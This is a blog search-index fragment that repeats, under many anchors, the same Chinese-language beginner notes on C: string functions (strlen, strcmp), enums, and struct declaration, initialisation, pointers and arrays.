line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串中找字符"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串中找字符串"},{"categories":["Programing"],"content":"\r11.1结构类型\r枚举是一种用户定义的数据类型，关键字enum 语法： enum 枚举类型名字 {名字0,.....,名字n}； 枚举类型名字通常并不真的使用，要用的是大括号里的名字，因为它们就是常量符号，它们的类型是int，值则依次从0到n enum colors {red, yellow,green}; 就创建了三个常量，red的值是0，yellow是1，green是2 当需要一些可以排列起来的常量时，定义枚举的意义就是给了这些常量值名字 #include \u003cstdio.h\u003e enum color {red,yellow,green}; void f(enum color c); int main() { enum color t = red; scanf_s(\"%d\", \u0026t); f(t); return 0; } void f(enum color c) { printf(\"%d\\n\", c); } 枚举量声明枚举量的时候可以指定值 enum COLOR {RED=1,YELLOW,GREEN = 5}; 这样的话，RED是1，YELLOW是2，GREEN是5，3和4就直接跳过了 枚举只是int即使给枚举类型的变量赋不存在的整数值也没有任何warning或error 虽然枚举类型可以当做类型使用，但实际上不好用 如果有意义上排比的名字，用枚举比const int 方便 枚举比宏(macro)号，因为枚举有int类型 ","date":"2023-11-17","objectID":"/c_language_notes/:11:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#111结构类型"},{"categories":["Programing"],"content":"\r11.1结构类型\r枚举是一种用户定义的数据类型，关键字enum 语法： enum 枚举类型名字 {名字0,.....,名字n}； 枚举类型名字通常并不真的使用，要用的是大括号里的名字，因为它们就是常量符号，它们的类型是int，值则依次从0到n enum colors {red, yellow,green}; 就创建了三个常量，red的值是0，yellow是1，green是2 当需要一些可以排列起来的常量时，定义枚举的意义就是给了这些常量值名字 #include enum color {red,yellow,green}; void f(enum color c); int main() { enum color t = red; scanf_s(\"%d\", \u0026t); f(t); return 0; } void f(enum color c) { printf(\"%d\\n\", c); } 枚举量声明枚举量的时候可以指定值 enum COLOR {RED=1,YELLOW,GREEN = 5}; 这样的话，RED是1，YELLOW是2，GREEN是5，3和4就直接跳过了 枚举只是int即使给枚举类型的变量赋不存在的整数值也没有任何warning或error 虽然枚举类型可以当做类型使用，但实际上不好用 如果有意义上排比的名字，用枚举比const int 方便 枚举比宏(macro)号，因为枚举有int类型 ","date":"2023-11-17","objectID":"/c_language_notes/:11:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#枚举"},{"categories":["Programing"],"content":"\r11.1结构类型\r枚举是一种用户定义的数据类型，关键字enum 语法： enum 枚举类型名字 {名字0,.....,名字n}； 枚举类型名字通常并不真的使用，要用的是大括号里的名字，因为它们就是常量符号，它们的类型是int，值则依次从0到n enum colors {red, yellow,green}; 就创建了三个常量，red的值是0，yellow是1，green是2 当需要一些可以排列起来的常量时，定义枚举的意义就是给了这些常量值名字 #include enum color {red,yellow,green}; void f(enum color c); int main() { enum color t = red; scanf_s(\"%d\", \u0026t); f(t); return 0; } void f(enum color c) { printf(\"%d\\n\", c); } 枚举量声明枚举量的时候可以指定值 enum COLOR {RED=1,YELLOW,GREEN = 5}; 这样的话，RED是1，YELLOW是2，GREEN是5，3和4就直接跳过了 枚举只是int即使给枚举类型的变量赋不存在的整数值也没有任何warning或error 虽然枚举类型可以当做类型使用，但实际上不好用 如果有意义上排比的名字，用枚举比const int 方便 枚举比宏(macro)号，因为枚举有int类型 ","date":"2023-11-17","objectID":"/c_language_notes/:11:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#枚举量"},{"categories":["Programing"],"content":"\r11.1结构类型\r枚举是一种用户定义的数据类型，关键字enum 语法： enum 枚举类型名字 {名字0,.....,名字n}； 枚举类型名字通常并不真的使用，要用的是大括号里的名字，因为它们就是常量符号，它们的类型是int，值则依次从0到n enum colors {red, yellow,green}; 就创建了三个常量，red的值是0，yellow是1，green是2 当需要一些可以排列起来的常量时，定义枚举的意义就是给了这些常量值名字 #include enum color {red,yellow,green}; void f(enum color c); int main() { enum color t = red; scanf_s(\"%d\", \u0026t); f(t); return 0; } void f(enum color c) { printf(\"%d\\n\", c); } 枚举量声明枚举量的时候可以指定值 enum COLOR {RED=1,YELLOW,GREEN = 5}; 这样的话，RED是1，YELLOW是2，GREEN是5，3和4就直接跳过了 枚举只是int即使给枚举类型的变量赋不存在的整数值也没有任何warning或error 虽然枚举类型可以当做类型使用，但实际上不好用 如果有意义上排比的名字，用枚举比const int 方便 枚举比宏(macro)号，因为枚举有int类型 ","date":"2023-11-17","objectID":"/c_language_notes/:11:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#枚举只是int"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include\u003cstdio.h\u003e int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include \u003cstdio.h\u003e struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#112结构"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#声明结构类型"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#声明结构的形式"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#第一种形式"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#第二种形式"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#第三种形式"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构的初始化"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构成员"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构运算"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 